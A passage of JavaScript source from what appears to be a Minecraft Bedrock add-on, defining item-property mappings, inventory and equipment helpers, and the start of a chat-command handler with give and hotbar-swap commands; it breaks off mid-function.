    propertyTypeEnum["minecraft:lockmode"] = "lockMode";
    propertyTypeEnum["lock_mode"] = "lockMode";
    propertyTypeEnum["minecraft:lock_mode"] = "lockMode";
    propertyTypeEnum["itemLockMode"] = "lockMode";
    propertyTypeEnum["minecraft:itemLockMode"] = "lockMode";
    propertyTypeEnum["itemlockmode"] = "lockMode";
    propertyTypeEnum["minecraft:itemlockmode"] = "lockMode";
    propertyTypeEnum["item_lock_mode"] = "lockMode";
    propertyTypeEnum["minecraft:item_lock_mode"] = "lockMode";
    propertyTypeEnum["canPlaceOn"] = "canPlaceOn";
    propertyTypeEnum["minecraft:canPlaceOn"] = "canPlaceOn";
    propertyTypeEnum["canplaceon"] = "canPlaceOn";
    propertyTypeEnum["minecraft:canplaceon"] = "canPlaceOn";
    propertyTypeEnum["can_place_on"] = "canPlaceOn";
    propertyTypeEnum["minecraft:can_place_on"] = "canPlaceOn";
    propertyTypeEnum["canDestroy"] = "canDestroy";
    propertyTypeEnum["minecraft:canDestroy"] = "canDestroy";
    propertyTypeEnum["candestroy"] = "canDestroy";
    propertyTypeEnum["minecraft:candestroy"] = "canDestroy";
    propertyTypeEnum["can_destroy"] = "canDestroy";
    propertyTypeEnum["minecraft:can_destroy"] = "canDestroy";
    propertyTypeEnum["components"] = "components";
    propertyTypeEnum["minecraft:components"] = "components";
    propertyTypeEnum["dynamicProperties"] = "dynamicProperties";
    propertyTypeEnum["minecraft:dynamicProperties"] = "dynamicProperties";
    propertyTypeEnum["dynamicproperties"] = "dynamicProperties";
    propertyTypeEnum["minecraft:dynamicproperties"] = "dynamicProperties";
    propertyTypeEnum["properties"] = "dynamicProperties";
    propertyTypeEnum["minecraft:properties"] = "dynamicProperties";
    propertyTypeEnum["itemProperties"] = "dynamicProperties";
    propertyTypeEnum["minecraft:itemProperties"] = "dynamicProperties";
    propertyTypeEnum["itemproperties"] = "dynamicProperties";
    propertyTypeEnum["minecraft:itemproperties"] = "dynamicProperties";
    propertyTypeEnum["clearAllDynamicProperties"] = "clearDynamicProperties";
    propertyTypeEnum["minecraft:clearAllDynamicProperties"] = "clearDynamicProperties";
    propertyTypeEnum["clearalldynamicproperties"] = "clearDynamicProperties";
    propertyTypeEnum["minecraft:clearalldynamicproperties"] = "clearDynamicProperties";
    propertyTypeEnum["clearDynamicProperties"] = "clearDynamicProperties";
    propertyTypeEnum["minecraft:clearDynamicProperties"] = "clearDynamicProperties";
    propertyTypeEnum["cleardynamicproperties"] = "clearDynamicProperties";
    propertyTypeEnum["minecraft:cleardynamicproperties"] = "clearDynamicProperties";
    propertyTypeEnum["removeDynamicProperties"] = "removeDynamicProperties";
    propertyTypeEnum["minecraft:removeDynamicProperties"] = "removeDynamicProperties";
    propertyTypeEnum["removedynamicproperties"] = "removedynamicproperties";
    propertyTypeEnum["minecraft:removedynamicproperties"] = "removedynamicproperties";
    propertyTypeEnum["removeDynamicProperty"] = "removeDynamicProperty";
    propertyTypeEnum["minecraft:removeDynamicProperty"] = "removeDynamicProperty";
    propertyTypeEnum["removedynamicproperty"] = "removedynamicproperty";
    propertyTypeEnum["minecraft:removedynamicproperty"] = "removedynamicproperty";
})(propertyTypeEnum || (propertyTypeEnum = {}));
export function itemJSONPropertiesEval(itemJSON, StartingItem, player) {
    let ij = itemJSON;
    ij.force ??= false;
    let sp = player;
    let item = (!!ij.new) ? (new ItemStack(ij.new[0], ij.new[1])) : (!!StartingItem ? (StartingItem instanceof ContainerSlot ? StartingItem.getItem() : StartingItem instanceof ItemStack ? StartingItem : undefined) : undefined) ?? (!!ij.source ? (ij.source.type == "slot" ? (!!ij.source.targetSelector ? (!!ij.source.targetSelectorExecutionLocation ? targetSelectorAllListD(ij.source.targetSelector, (ij.source.targetSelectorExecutionLocation.x + " " + ij.source.targetSelectorExecutionLocation.y + " " + ij.source.targetSelectorExecutionLocation.z), ij.source.targetSelectorExecutionLocation.dimension)[0] : targetSelectorAllListC(ij.source.targetSelector, "", (ij.source.targetSelectorSourceEntity.location.x + " " + ij.source.targetSelectorSourceEntity.location.y + " " + ij.source.targetSelectorSourceEntity.location.z), ij.source.targetSelectorSourceEntity)[0])?.getComponent?.("inventory") : !!ij.source.entityId ? getEntityById(ij.source.entityId)?.getComponent?.("inventory") : !!ij.source.player ? getPlayer(ij.source.player)?.getComponent?.("inventory") : !!ij.source.entityAtBlock ? ij.source.entityAtBlock.dimension.getEntitiesAtBlockLocation(ij.source.entityAtBlock).find(v => v.typeId == ij.source.entityTypeId ?? ij.source.entityType)?.getComponent?.("inventory") : !!ij.source.block ? ij.source.block.dimension.getBlock(ij.source.block)?.getComponent?.("inventory") : sp?.getComponent?.("inventory"))?.container?.getItem(ij.source.slot ?? 0) : new ItemStack(ij.source.id, ij.source.count ?? ij.source.amount)) : new ItemStack(ij?.id ?? ij?.type ?? ij?.itemId, ij?.count ?? ij?.amount)); /*
    if(!!ij.new){item=new ItemStack(ij.new[0], ij.new[1])}*/
    const itemPropertyEnum = {
        "components": (property) => Object.entries(property[1]).forEach(vb => itemComponentEnum[componentTypeEnum[vb[0]]](vb)),
        "nameTag": (property) => (property[1] !== item.nameTag || ij.force) ? item.nameTag = property[1] : false,
        "lore": (property) => (property[1] !== item.getLore() || ij.force) ? item.setLore(property[1]) : false,
        "amount": (property) => (property[1] != item.amount || ij.force) ? item.amount = property[1] : false,
        "keepOnDeath": (property) => (property[1] != item.keepOnDeath || ij.force) ? item.keepOnDeath = property[1] : false,
        "lockMode": (property) => (property[1] != item.lockMode || ij.force) ? item.lockMode = property[1] : false,
        "canPlaceOn": (property) => (property[1] !== item.getCanPlaceOn() || ij.force) ? item.setCanPlaceOn(property[1]) : false,
        "canDestroy": (property) => (property[1] !== item.getCanDestroy() || ij.force) ? item.setCanDestroy(property[1]) : false,
        "dynamicProperties": (property) => (property[1] instanceof Array) ? property[1].forEach(vc => item.setDynamicProperty(vc[0], vc[1])) : Object.entries(property[1]).forEach(vc => item.setDynamicProperty(vc[0], vc[1])),
        "clearDynamicProperties": (property) => item.clearDynamicProperties(),
        "removeDynamicProperties": (property) => property[1].forEach(v => item.setDynamicProperty(v)),
        "removeDynamicProperty": (property) => item.setDynamicProperty(property[1])
    };
    const itemComponentEnum = {
        "enchantable": (property) => Object.entries(property[1]).forEach(vc => itemEnchantableComponentEnum[enchantableComponentTypeEnum[vc[0]]](vc)),
        "durability": (property) => typeof property[1] == "number" ? item.getComponent("durability").damage = item.getComponent("durability").maxDurability - property[1] : Object.entries(property[1]).forEach(v => itemDurabilityComponentEnum[durabilityComponentTypeEnum[v[0]]](v[1])),
        "damage": (property) => typeof property[1] == "number" ? item.getComponent("durability").damage = property[1] : Object.entries(property[1]).forEach(v => itemDurabilityComponentEnum[durabilityComponentTypeEnum[v[0]]](v)),
        "food": (property) => { },
        "cooldown": (property) => { }
    };
    const itemEnchantableComponentEnum = {
        "addEnchantment": (property) => (property[1] instanceof Array) ? item.getComponent("enchantable").addEnchantments(property[1]) : item.getComponent("enchantable").addEnchantment(property[1]),
        "addEnchantments": (property) => item.getComponent("enchantable").addEnchantments(property[1]),
        "removeEnchantment": (property) => (property[1] instanceof Array) ? property[1].forEach(v => item.getComponent("enchantable").removeEnchantment(v)) : item.getComponent("enchantable").removeEnchantment(property[1]),
        "removeAllEnchantments": (property) => item.getComponent("enchantable").removeAllEnchantments()
    };
    const itemDurabilityComponentEnum = {
        "durability": (property) => item.getComponent("durability").damage = item.getComponent("durability").maxDurability - property[1],
        "damage": (property) => item.getComponent("durability").damage = property[1],
        "repair": (property) => typeof property[1] == "number" ? item.getComponent("durability").damage = Math.max(0, item.getComponent("durability").damage - property[1]) : item.getComponent("durability").damage = 0,
        "setDurabilityToMax": (property) => item.getComponent("durability").damage = 0
    };
    Object.entries(ij).filter(v => !["force", "source", "id", "type", "itemId", "new"].includes(v[0])).forEach(va => itemPropertyEnum[propertyTypeEnum[va[0]]](va));
    return item;
    /*

    ij = {name: "sazx", components: {enchantable: {add: [{type: "fire_aspect", level: 2}, {type: "sharpness", level: 5}, {type: "looting", level: 3}, {type: "knockback", level: 2}]}}}*/
}
export function itemJSONPropertiesEvalCT(itemJSON, containerSlot, player) {
    let ij = itemJSON;
    ij.force ??= false;
    let sp = player;
    let item = containerSlot;
    if (!!ij.new) {
        item.setItem(new ItemStack(ij.new[0], ij.new[1]));
    }
    const itemPropertyEnum = {
        "components": (property) => Object.entries(property[1]).forEach(vb => itemComponentEnum[componentTypeEnum[vb[0]]](vb)),
        "nameTag": (property) => (property[1] !== item.nameTag || ij.force) ? item.nameTag = property[1] : false,
        "lore": (property) => (property[1] !== item.getLore() || ij.force) ? item.setLore(property[1]) : false,
        "amount": (property) => (property[1] != item.amount || ij.force) ? item.amount = property[1] : false,
        "keepOnDeath": (property) => (property[1] != item.keepOnDeath || ij.force) ? item.keepOnDeath = property[1] : false,
        "lockMode": (property) => (property[1] != item.lockMode || ij.force) ? item.lockMode = property[1] : false,
        "canPlaceOn": (property) => (property[1] !== item.getCanPlaceOn() || ij.force) ? item.setCanPlaceOn(property[1]) : false,
        "canDestroy": (property) => (property[1] !== item.getCanDestroy() || ij.force) ? item.setCanDestroy(property[1]) : false,
        "dynamicProperties": (property) => (property[1] instanceof Array) ? property[1].forEach(vc => item.setDynamicProperty(vc[0], vc[1])) : Object.entries(property[1]).forEach(vc => item.setDynamicProperty(vc[0], vc[1])),
        "clearDynamicProperties": (property) => item.clearDynamicProperties(),
        "removeDynamicProperties": (property) => property[1].forEach(v => item.setDynamicProperty(v)),
        "removeDynamicProperty": (property) => item.setDynamicProperty(property[1])
    };
    const itemComponentEnum = {
        "enchantable": (property) => Object.entries(property[1]).forEach(vc => itemEnchantableComponentEnum[enchantableComponentTypeEnum[vc[0]]](vc)),
        "durability": (property) => typeof property[1] == "number" ? (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = itemb.getComponent("durability").maxDurability - property[1]; item.setItem(itemb); })() : Object.entries(property[1]).forEach(v => itemDurabilityComponentEnum[durabilityComponentTypeEnum[v[0]]](v[1])),
        "damage": (property) => typeof property[1] == "number" ? (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = property[1]; item.setItem(itemb); })() : Object.entries(property[1]).forEach(v => itemDurabilityComponentEnum[durabilityComponentTypeEnum[v[0]]](v)),
        "food": (property) => { },
        "cooldown": (property) => { }
    };
    const itemEnchantableComponentEnum = {
        "addEnchantment": (property) => (property[1] instanceof Array) ? (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").addEnchantments(property[1]); item.setItem(itemb); })() : (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").addEnchantment(property[1]); item.setItem(itemb); })(),
        "addEnchantments": (property) => (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").addEnchantments(property[1]); item.setItem(itemb); })(),
        "removeEnchantment": (property) => (property[1] instanceof Array) ? property[1].forEach(v => (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").removeEnchantment(v); item.setItem(itemb); })()) : (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").removeEnchantment(property[1]); item.setItem(itemb); })(),
        "removeAllEnchantments": (property) => (() => { let itemb = item.getItem(); itemb.getComponent("enchantable").removeAllEnchantments(); item.setItem(itemb); })()
    };
    const itemDurabilityComponentEnum = {
        "durability": (property) => (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = itemb.getComponent("durability").maxDurability - property[1]; item.setItem(itemb); })(),
        "damage": (property) => (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = property[1]; item.setItem(itemb); })(),
        "repair": (property) => typeof property[1] == "number" ? (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = Math.max(0, itemb.getComponent("durability").damage - property[1]); item.setItem(itemb); })() : (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = 0; item.setItem(itemb); })(),
        "setDurabilityToMax": (property) => (() => { let itemb = item.getItem(); itemb.getComponent("durability").damage = 0; item.setItem(itemb); })()
    };
    Object.entries(ij).filter(v => !["force", "source", "id", "type", "itemId", "new"].includes(v[0])).forEach(va => itemPropertyEnum[propertyTypeEnum[va[0]]](va));
    return item;
    /*

    ij = {name: "sazx", components: {enchantable: {add: [{type: "fire_aspect", level: 2}, {type: "sharpness", level: 5}, {type: "looting", level: 3}, {type: "knockback", level: 2}]}}}*/
}
export function rangeToIntArray(range) { let array = []; for (let i = range[0]; i < range[1]; i++) {
    array.push(i);
} ; return array; }
export function inventorySwap(player1, player2) {
    for (let i = 0; i < 36; i++) {
        player1.getComponent("inventory").container.swapItems(i, i, player2.getComponent("inventory").container);
    }
    ;
    let slots = [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand];
    for (let i = 0; i < 5; i++) {
        let item1 = player1.getComponent("equippable").getEquipment(slots[i]);
        let item2 = player2.getComponent("equippable").getEquipment(slots[i]);
        player1.getComponent("equippable").setEquipment(slots[i], item2);
        player2.getComponent("equippable").setEquipment(slots[i], item1);
    }
    ;
}
export function inventorySwapB(player1, player2) {
    for (let i = 0; i < 36; i++) {
        player1.swapItems(i, i, player2);
    }
    ;
}
export function inventorySwapC(player1, player2, player1indices = [0, 27], player2indices = [0, 27]) {
    for (let i = 0; i < Math.min(player1indices[1] - player1indices[0], player2indices[1] - player2indices[0]); i++) {
        player1.swapItems(i + player1indices[0], i + player2indices[0], player2);
    }
    ;
}
export function clearContainer(container) {
    for (let i = 0; i < container.size; i++) {
        container.setItem(i);
    }
    ;
}
export function fillContainer(container, item) {
    for (let i = 0; i < container.size; i++) {
        container.setItem(i, item);
    }
    ;
}
export function containerToItemStackArray(container) {
    let itemList = [];
    for (let i = 0; i < container.size; i++) {
        itemList.push(container.getItem(i));
    }
    ;
    return itemList;
}
export function containerToContainerSlotArray(container) {
    let itemList = [];
    for (let i = 0; i < container.size; i++) {
        itemList.push(container.getSlot(i));
    }
    ;
    return itemList;
}
export function equippableToItemStackArray(equippable, includeMainhand = false) {
    let itemList = [];
    for (let i = 0; i < 5 + Number(includeMainhand); i++) {
        itemList.push(equippable?.getEquipment(includeMainhand ? EquipmentSlots[i] : OtherEquipmentSlots[i]));
    }
    ;
    return itemList;
}
export function equippableToContainerSlotArray(equippable, includeMainhand = false) {
    let itemList = [];
    for (let i = 0; i < 5 + Number(includeMainhand); i++) {
        itemList.push(equippable?.getEquipmentSlot(includeMainhand ? EquipmentSlots[i] : OtherEquipmentSlots[i]));
    }
    ;
    return itemList;
}
export function entityToItemStackArray(entity, getContainer = true, getEquipment = true) {
    let itemList = [];
    let container = entity.getComponent("inventory")?.container;
    let equipment = entity.getComponent("equippable");
    for (let i = 0; i < container?.size ?? 0; i++) {
        itemList.push(container.getItem(i));
    }
    ;
    for (let i = 0; (i < 5) && getEquipment && (!!equipment); i++) {
        itemList.push(equipment?.getEquipment(OtherEquipmentSlots[i]));
    }
    ;
    return itemList;
}
export function blockToItemStackArray(block) {
    let itemList = [];
    let container = block.getComponent("inventory")?.container;
    for (let i = 0; i < container.size; i++) {
        itemList.push(container.getItem(i));
    }
    ;
    return itemList;
}
export function entityToContainerSlotArray(entity, getContainer = true, getEquipment = true) {
    let itemList = [];
    let container = entity.getComponent("inventory")?.container;
    let equipment = entity.getComponent("equippable");
    for (let i = 0; (i < container?.size ?? 0) && getContainer; i++) {
        itemList.push(container.getSlot(i));
    }
    ;
    for (let i = 0; (i < 5) && getEquipment && (!!equipment); i++) {
        itemList.push(equipment?.getEquipmentSlot(OtherEquipmentSlots[i]));
    }
    ;
    return (!!container || !!equipment) ? itemList : undefined;
}
export function blockToContainerSlotArray(block) {
    let itemList = [];
    let container = block.getComponent("inventory")?.container;
    for (let i = 0; i < container?.size ?? 0; i++) {
        itemList.push(container.getSlot(i));
    }
    ;
    return !!container ? itemList : undefined;
}
export function entityToContainerSlotListObject(entity, getContainer = true, getEquipment = true) {
    let itemList = {};
    let container = entity.getComponent("inventory")?.container;
    let equipment = entity.getComponent("equippable");
    for (let i = 0; (i < container?.size ?? 0) && getContainer; i++) {
        itemList[String(i)] = container.getSlot(i);
    }
    ;
    for (let i = 0; (i < 5) && getEquipment && (!!equipment); i++) {
        itemList[String(OtherEquipmentSlots[i])] = equipment?.getEquipmentSlot(OtherEquipmentSlots[i]);
    }
    ;
    return (!!container || !!equipment) ? itemList : undefined;
}
export function blockToContainerSlotListObject(block) {
    let itemList = {};
    let container = block.getComponent("inventory")?.container;
    for (let i = 0; i < container?.size ?? 0; i++) {
        itemList[String(i)] = container.getSlot(i);
    }
    ;
    return !!container ? itemList : undefined;
}
export function entityToContainerSlotArrayB(entity, getContainer = true, getEquipment = true) {
    let itemList = [];
    let itemListB = [];
    let container = entity.getComponent("inventory")?.container;
    let equipment = entity.getComponent("equippable");
    for (let i = 0; (i < container?.size ?? 0) && getContainer; i++) {
        itemList.push(container.getSlot(i));
    }
    ;
    for (let i = 0; (i < 5) && getEquipment && (!!equipment); i++) {
        itemListB.push(equipment?.getEquipmentSlot(OtherEquipmentSlots[i]));
    }
    ;
    return (!!container || !!equipment) ? { inventory: itemList, equipment: itemListB } : undefined;
}
export function getPlayerSelectedSlot(player) {
    return player.getComponent("inventory").container.getSlot(player.selectedSlot);
}
export function getInventory(containerBlockPlayerOrEntity) {
    return (containerBlockPlayerOrEntity instanceof Block ? containerBlockPlayerOrEntity.getComponent("inventory") : containerBlockPlayerOrEntity.getComponent("inventory"));
}
export function getEquipment(containerBlockPlayerOrEntity) {
    return containerBlockPlayerOrEntity.getComponent("equippable");
}
export const JunkItemTypes = ["dirt", "stick", "deadbush", "tripwire_hook", "rotten_flesh", "string", "cobblestone", "stone", "diorite", "andesite", "granite", "tuff", "end_stone", "wheat_seeds", "tallgrass", "leather_helmet", "leather_boots", "leather_chestplate", "leather_leggings", "wooden_sword", "wooden_axe", "wooden_pickaxe", "wooden_shovel", "wooden_hoe", "spider_eye"];
export const OpItemTypes = ["diamond", "netherite_ingot", "gold_ingot", "iron_ingot", "diamond_sword", "diamond_chestplate", "diamond_helmet", "diamond_leggings", "diamond_boots", "diamond_pickaxe", "diamond_shovel", "diamond_hoe", "diamond_block"];
export const IllegalItemTypes = ["netherreactor", "glowingobsidian", "stonecutter", "water", "flowing_water", "lava", "flowing_lava", "camera", "item.camera", "item.skull", "item.cauldron", "bedrock"];
export function parseSlot(slot, selectedSlot) { return [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][["head", "chest", "legs", "feet", "mainhand", "offhand", "helmet", "chestplate", "leggings", "boots", "hand", "otherhand", "cap", "tunic", "pants", "shoes", "righthand", "lefthand", "hat", "shirt", "shorts", "sandals", "firsthand", "secondaryhand"].findIndex(v => v == slot?.trim()?.toLowerCase()) % 6] ?? (((slot?.trim() == "~" || slot?.trim() == "") && !!!selectedSlot) ? "~" : Number(slot.trim())); }
export function getSlotFromParsedSlot(slot, options) { if (typeof slot == "string") {
    return slot.trim() == "~" ? (!!options?.selectedSlot ? options?.container?.getSlot(Number(options?.selectedSlot)) : (!!options?.equipment ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Mainhand) : undefined)) : (!!options?.equipment ? slot.trim().toLowerCase() == "head" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Head) : slot.trim().toLowerCase() == "chest" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Chest) : slot.trim().toLowerCase() == "legs" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Legs) : slot.trim().toLowerCase() == "feet" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Feet) : slot.trim().toLowerCase() == "mainhand" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Mainhand) : slot.trim().toLowerCase() == "offhand" ? options?.equipment?.getEquipmentSlot(EquipmentSlot.Offhand) : !Number.isNaN(Number(slot)) ? options?.container?.getSlot(Number(slot)) : undefined : !Number.isNaN(Number(slot)) ? options?.container?.getSlot(Number(slot)) : undefined);
}
else if (typeof slot == "number") {
    return options?.container?.getSlot(Number(slot));
}
else
    return options?.container?.getSlot(Number(slot)); }
export function chatCommands(params) {
    let returnBeforeChatSend = params.returnBeforeChatSend ?? false;
    let player = params.player ?? params.eventData?.sender ?? params.event?.sender;
    let eventData = params.eventData ?? params.event;
    let event = params.event ?? params.eventData;
    let newMessage = params.newMessage ?? params.eventData?.message ?? params.event?.message;
    try {
        world.getAllPlayers().filter((p) => (p.hasTag("getAllChatCommands"))).forEach((p) => { try {
            p.sendMessage("[§l§dServer§r§f][" + player.name + "]: " + newMessage);
        }
        catch { } });
    }
    catch { }
    function hotbarSwap(row, preset) {
        let inventorye = player.getComponent("inventory");
        let inventoryblock = world.getDimension(String(player.getDynamicProperty("hotbarPreset" + preset)).replaceAll(",", "").split(" ")[0]).getBlock({ x: Number(String(player.getDynamicProperty("hotbarPreset" + preset)).replaceAll(",", "").split(" ")[1]), y: Number(String(player.getDynamicProperty("hotbarPreset" + preset)).replaceAll(",", "").split(" ")[2]), z: Number(String(player.getDynamicProperty("hotbarPreset" + preset)).replaceAll(",", "").split(" ")[3]) }).getComponent("inventory");
        system.run(() => { try {
            for (let i = 0; i < 9; i++) {
                inventorye.container.swapItems(i, i + ((row - 1) * 9), inventoryblock.container);
            }
            ; /*; eventData.sender.sendMessage(String("l" + slotsArray))*/
        }
        catch (e) {
            eventData.sender.sendMessage("§c" + e + " " + e.stack);
        } });
    }
    let switchTest = newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length).split(" ")[0];
    let switchTestB = newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length);
    let commanda = commands.find(v => (newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && (command.get(v.commandName, "built-in").settings.enabled && (!!switchTest.match((command.get(v.commandName, "built-in").regexp))))) && (command.get(v.commandName, "built-in").testCanPlayerUseCommand(player))) ?? commands.find(v => (newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && (command.get(v.commandName, "built-in").settings.enabled && (!!command.get(v.commandName, "built-in")?.aliases?.find?.(vd => !!switchTest.match(vd.regexp))))) && (command.get(v.commandName, "built-in").testCanPlayerUseCommand(player))) ?? command.getCustomCommands().find(v => (v.settings.enabled && ((v.customCommandPrefix == undefined || v.customCommandPrefix == "") && (!!switchTest.match(v.regexp))) || ((v.customCommandPrefix != "" && !!v.customCommandPrefix) && newMessage.split(" ")[0].startsWith(v.customCommandPrefix) && (!!newMessage.split(" ")[0].slice(v.customCommandPrefix.length).match(v.regexp)) && (command.get(v.commandName, "custom").testCanPlayerUseCommand(player))))); /*
    let commanda = commands.find(v=>(newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"))&&(command.get(v.commandName, "built-in").settings.enabled&&(!!(switchTest.match((command.get(v.commandName, "built-in").regexp))))))&&(command.get(v.commandName, "built-in").testCanPlayerUseCommand(player)))??command.getCustomCommands().find(v=>(v.settings.enabled&&((v.customCommandPrefix==undefined||v.customCommandPrefix=="")&&(!!switchTest.match(v.regexp)))||((v.customCommandPrefix!=""&&!!v.customCommandPrefix)&&newMessage.split(" ")[0].startsWith(v.customCommandPrefix)&&(!!newMessage.split(" ")[0].slice(v.customCommandPrefix.length).match(v.regexp))&&(command.get(v.commandName, "custom").testCanPlayerUseCommand(player)))))*/
    if (commanda?.type == "built-in") {
        switch (true) {
            case !!switchTest.match(/^give$/):
                eventData.cancel = true;
                const inventory = player.getComponent("inventory");
                system.run(() => { try {
                    inventory.container.addItem(new ItemStack(newMessage.slice(6).split(" ")[0], Number(newMessage.slice(6).split(" ")[1])));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + " " + e.stack);
                } });
                break;
            case !!switchTest.match(/^giveb$/):
                eventData.cancel = true;
                const inventoryb = player.getComponent("inventory");
                system.run(() => { try {
                    let slotsArray = [];
                    for (let i = 0; i < inventoryb.inventorySize; i++) {
                        if (inventoryb.container.getItem(Number(i)) !== undefined) {
                            slotsArray = slotsArray.concat(String(inventoryb.container.getItem(Number(i)).typeId));
                        }
                        else {
                            slotsArray = slotsArray.concat("undefined");
                        }
                    }
                    ;
                    inventoryb.container.setItem(slotsArray.findIndex((itemName) => (itemName == "undefined")), new ItemStack(newMessage.slice(7).split(" ")[0], Number(newMessage.slice(7).split(" ")[1]))); /*; eventData.sender.sendMessage(String("l" + slotsArray))*/
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                } });
                break;
            case !!switchTest.match(/^givec$/):
                {
                    eventData.cancel = true;
                    const inventoryb = player.getComponent("inventory");
                    if (switchTestB.trim().split(" ").length == 1) {
                        player.sendMessage(`givec custom command format: \n${command.dp}givec <itemJSON: itemJSON>
simplified itemJSON format (type "${String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")}help itemJSONFormat" to see full format options): 
{
    "name"?: string,
    "lore"?: string[],
    "count"?: number,
    "keepondeath"?: boolean,
    "lockmode"?: ItemLockMode,
    "canplaceon"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "clear"?: any
        },
        "durability"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        }
    },
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    cleardynamicproperties?: any,
    removedynamicproperties?: string[],
    removedynamicproperty?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`);
                    }
                    else if (!!!(JSONParse(switchTestB.split(" ").slice(1).join(" ")).type ?? JSONParse(switchTestB.split(" ").slice(1).join(" ")).typeId ?? JSONParse(switchTestB.split(" ").slice(1).join(" ")).id ?? JSONParse(switchTestB.split(" ").slice(1).join(" ")).itemType)) {
                        player.sendMessage("§cError: Item type not specified in JSON. ");
                    }
                    else {
                        system.run(() => { try {
                            let slotsArray = [];
                            for (let i = 0; i < inventoryb.inventorySize; i++) {
                                if (inventoryb.container.getItem(Number(i)) !== undefined) {
                                    slotsArray = slotsArray.concat(String(inventoryb.container.getItem(Number(i)).typeId));
                                }
                                else {
                                    slotsArray = slotsArray.concat("undefined");
                                }
                            }
                            ;
                            inventoryb.container.setItem(slotsArray.findIndex((itemName) => (itemName == "undefined")), itemJSONPropertiesEval(JSONParse(switchTestB.split(" ").slice(1).join(" ")), undefined, player)); /*; eventData.sender.sendMessage(String("l" + slotsArray))*/
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        } });
                    }
                }
                break; /*
            case !!switchTest.match(/^h1$/):
                eventData.cancel = true;
                let inventorye = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblock = world.getDimension(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventorye.container.swapItems(i, i, inventoryblock.container)}; */ /*; eventData.sender.sendMessage(String("l" + slotsArray))*/ /*}catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
                break; */
            case !!switchTest.match(/^h\d*$/):
                eventData.cancel = true;
                try { /*player.sendMessage([String(Number(switchTestB.split(" ")[1] ?? 0)+1), String(switchTestB.split(" ")[0].slice(1))]); */
                    hotbarSwap(Number(switchTestB.split(" ")[1] ?? 0) + 1, Number(switchTestB.split(" ")[0].slice(1)));
                }
                catch (e) {
                    player.sendMessage([e, e.stack]);
                }
                break;
            case !!switchTest.match(/^hset$/):
                eventData.cancel = true;
                let coordinates = { x: undefined, y: undefined, z: undefined };
                try {
